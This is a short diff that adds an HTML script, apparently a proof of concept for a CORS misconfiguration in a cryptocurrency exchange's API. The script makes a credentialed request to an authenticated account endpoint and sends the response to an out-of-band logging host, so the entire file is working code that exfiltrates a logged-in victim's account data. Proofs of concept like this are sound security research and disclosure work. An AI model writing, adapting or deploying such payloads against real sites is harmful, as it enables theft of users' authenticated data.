@@ -1,0 +1,11 @@
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://api.woox.io/userauth/account/ip_info',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+ location='//xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/log?key='+this.responseText;
+};
+</script>
